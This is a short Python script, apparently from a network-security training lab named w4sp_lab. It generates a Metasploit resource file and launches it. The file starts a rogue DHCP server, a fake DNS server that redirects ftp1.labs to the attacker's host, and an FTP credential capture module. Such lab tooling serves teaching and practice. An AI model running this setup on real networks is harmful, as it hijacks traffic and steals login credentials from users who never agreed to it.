import os
import time
import netifaces
from subprocess import call



#rc script to startup dhcp server, fakedns, and ftp capture
msf_rc = """
spool %s
use auxiliary/server/dhcp
set NETMASK 255.255.255.0
set DOMAINNAME %s
set SET SRVHOST %s
exploit -j -q

use auxiliary/server/fakedns
set TARGETACTION FAKE
set TARGETDOMAIN ftp1.labs
set TARGETHOST %s
exploit -j -q

use auxiliary/server/capture/ftp
exploit
"""


root_ip = False
while not root_ip:
    try:
        root_ip = netifaces.ifaddresses('w4sp_lab')[2][0]['addr']
    except (ValueError, KeyError) as e:
        #probably means interface isn't up, try again
        pass


spool_dir = os.getcwd() + os.path.sep + 'tmp_spool'

with open('dns.rc', 'w+') as f:
    tmp = msf_rc % (spool_dir, root_ip, root_ip, root_ip)
    f.write(tmp)


call(['msfconsole', '-r', 'dns.rc'])


